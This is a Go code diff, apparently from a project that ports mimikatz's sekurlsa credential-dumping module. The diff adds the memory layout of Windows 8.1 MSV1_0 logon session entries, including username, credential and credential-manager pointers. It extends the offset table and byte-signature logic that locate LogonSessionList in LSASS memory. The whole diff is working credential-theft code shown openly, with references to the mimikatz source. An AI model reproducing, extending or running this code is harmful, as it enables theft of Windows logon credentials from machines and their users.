@@ -15,6 +15,9 @@ import (
 	"project/internal/module/windows/api"
 )
 
+// reference:
+// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
+
 var (
 	patternWin5xX64LogonSessionList = []byte{
 		0x4C, 0x8B, 0xDF, 0x49, 0xC1, 0xE3, 0x04, 0x48, 0x8B, 0xCB, 0x4C, 0x03, 0xD8,
@@ -37,7 +40,7 @@ var (
 	patternWin1803X64LogonSessionList = []byte{
 		0x33, 0xFF, 0x45, 0x89, 0x37, 0x48, 0x8B, 0xF3, 0x45, 0x85, 0xC9, 0x74,
 	}
-	// key = build
+	// key = build version
 	lsaSrvReferencesX64 = map[uint32]*patchGeneric{
 		buildWinXP: {
 			search: &patchPattern{
@@ -138,7 +141,7 @@ var (
 	patternWin6xX86LogonSessionList = []byte{
 		0x8B, 0x4D, 0xE8, 0x8B, 0x45, 0xF4, 0x89, 0x75, 0xEC, 0x89, 0x01, 0x85, 0xFF, 0x74,
 	}
-	// key = build
+	// key = build version
 	lsaSrvReferencesX86 = map[uint32]*patchGeneric{
 		buildWinXP: {
 			search: &patchPattern{
@@ -229,6 +232,54 @@ func (kiwi *Kiwi) searchLogonSessionListAddress(pHandle windows.Handle, patch *p
 	return nil
 }
 
+// reference:
+// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.h
+
+type msv10List62 struct {
+	fLink         uintptr // point to msv10List62
+	bLink         uintptr // point to msv10List62
+	unknown0      uintptr
+	unknown1      uint32
+	unknown2      uintptr
+	unknown3      uint32
+	unknown4      uint32
+	unknown5      uint32
+	hSemaphore6   uintptr
+	unknown7      uintptr
+	hSemaphore8   uintptr
+	unknown9      uintptr
+	unknown10     uintptr
+	unknown11     uint32
+	unknown12     uint32
+	unknown13     uintptr
+	logonID       windows.LUID
+	luid1         windows.LUID
+	username      api.LSAUnicodeString
+	domainName    api.LSAUnicodeString
+	unknown14     uintptr
+	unknown15     uintptr
+	typ           api.LSAUnicodeString
+	sid           uintptr
+	logonType     uint32
+	unknown18     uintptr
+	session       uint32
+	logonTime     int64
+	logonServer   api.LSAUnicodeString
+	credentials   uintptr
+	unknown19     uintptr
+	unknown20     uintptr
+	unknown21     uintptr
+	unknown22     uint32
+	unknown23     uint32
+	unknown24     uint32
+	unknown25     uint32
+	unknown26     uint32
+	unknown27     uintptr
+	unknown28     uintptr
+	unknown29     uintptr
+	credentialMgr uintptr
+}
+
 type msv10List63 struct {
 	fLink         uintptr // point to msv10List63
 	bLink         uintptr // point to msv10List63
@@ -246,7 +297,7 @@ type msv10List63 struct {
 	unknown11     uint32
 	unknown12     uint32
 	unknown13     uintptr
-	logonID       windows.LUID // logon ID
+	logonID       windows.LUID
 	luid1         windows.LUID
 	waZa          [12]byte
 	username      api.LSAUnicodeString
@@ -275,6 +326,9 @@ type msv10List63 struct {
 	credentialMgr uintptr
 }
 
+// reference:
+// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
+
 type lsaEnum struct {
 	size                  uintptr
 	offsetToLogonID       uint32
@@ -289,22 +343,39 @@ type lsaEnum struct {
 	offsetToLogonServer   uint32
 }
 
-// key = minimum windows build
-var lsaEnums = map[uint32]*lsaEnum{
-	buildMinWin10: {
-		size:                  unsafe.Sizeof(msv10List63{}),
-		offsetToLogonID:       uint32(unsafe.Offsetof(msv10List63{}.logonID)),
-		offsetToLogonType:     uint32(unsafe.Offsetof(msv10List63{}.logonType)),
-		offsetToSession:       uint32(unsafe.Offsetof(msv10List63{}.session)),
-		offsetToUsername:      uint32(unsafe.Offsetof(msv10List63{}.username)),
-		offsetToDomainName:    uint32(unsafe.Offsetof(msv10List63{}.domainName)),
-		offsetToCredentials:   uint32(unsafe.Offsetof(msv10List63{}.credentials)),
-		offsetToSID:           uint32(unsafe.Offsetof(msv10List63{}.sid)),
-		offsetToCredentialMgr: uint32(unsafe.Offsetof(msv10List63{}.credentialMgr)),
-		offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List63{}.logonTime)),
-		offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List63{}.logonServer)),
-	},
-}
+var (
+	msv10List62Struct = msv10List62{}
+	msv10List63Struct = msv10List63{}
+	// key = minimum windows build
+	lsaEnums = map[uint32]*lsaEnum{
+		buildMinWinBlue: {
+			size:                  unsafe.Sizeof(msv10List62Struct),
+			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List62Struct.logonID)),
+			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List62Struct.logonType)),
+			offsetToSession:       uint32(unsafe.Offsetof(msv10List62Struct.session)),
+			offsetToUsername:      uint32(unsafe.Offsetof(msv10List62Struct.username)),
+			offsetToDomainName:    uint32(unsafe.Offsetof(msv10List62Struct.domainName)),
+			offsetToCredentials:   uint32(unsafe.Offsetof(msv10List62Struct.credentials)),
+			offsetToSID:           uint32(unsafe.Offsetof(msv10List62Struct.sid)),
+			offsetToCredentialMgr: uint32(unsafe.Offsetof(msv10List62Struct.credentialMgr)),
+			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List62Struct.logonTime)),
+			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List62Struct.logonServer)),
+		},
+		buildMinWin10: {
+			size:                  unsafe.Sizeof(msv10List63Struct),
+			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List63Struct.logonID)),
+			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List63Struct.logonType)),
+			offsetToSession:       uint32(unsafe.Offsetof(msv10List63Struct.session)),
+			offsetToUsername:      uint32(unsafe.Offsetof(msv10List63Struct.username)),
+			offsetToDomainName:    uint32(unsafe.Offsetof(msv10List63Struct.domainName)),
+			offsetToCredentials:   uint32(unsafe.Offsetof(msv10List63Struct.credentials)),
+			offsetToSID:           uint32(unsafe.Offsetof(msv10List63Struct.sid)),
+			offsetToCredentialMgr: uint32(unsafe.Offsetof(msv10List63Struct.credentialMgr)),
+			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List63Struct.logonTime)),
+			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List63Struct.logonServer)),
+		},
+	}
+)
 
 // LogonSession contains information about session.
 type LogonSession struct {
